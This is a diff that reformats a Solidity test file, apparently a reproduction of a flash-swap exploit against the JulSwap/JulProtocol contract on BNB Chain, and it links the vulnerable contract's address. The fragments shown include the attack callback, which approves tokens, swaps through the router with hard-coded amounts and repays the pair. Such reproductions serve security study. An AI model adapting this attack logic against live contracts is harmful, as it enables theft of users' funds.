@@ -14,13 +14,25 @@ import "../interface.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0x32dffc3fe8e3ef3571bf8a72c0d0015c5373f41d#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
+
 interface IBNBRouter {
-    function swapExactTokensForBNB(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
-    function swapBNBForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
+    function swapExactTokensForBNB(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+    function swapBNBForExactTokens(
+        uint256 amountOut,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256[] memory amounts);
 }
 
 interface IJulProtocolV2 {
@@ -52,7 +64,6 @@ contract JulSwap is BaseTestWithBalanceLog {
     }
 
     function BSCswapCall(address, uint256 amount0, uint256, bytes memory) external {
-        
         IERC20(JULb).approve(Router, type(uint256).max);
 
         address[] memory path0 = new address[](2);
@@ -66,7 +77,9 @@ contract JulSwap is BaseTestWithBalanceLog {
         address[] memory path1 = new address[](2);
         path1[0] = wBNB;
         path1[1] = JULb;
-        IBNBRouter(Router).swapBNBForExactTokens{value: 885.146882180525770269 ether}(amountOut, path1, address(this), 1_622_156_211);
+        IBNBRouter(Router).swapBNBForExactTokens{value: 885.146882180525770269 ether}(
+            amountOut, path1, address(this), 1_622_156_211
+        );
         IERC20(JULb).transfer(BSCswapPair, 70_210_631_895_687_061_183_551);
     }
 
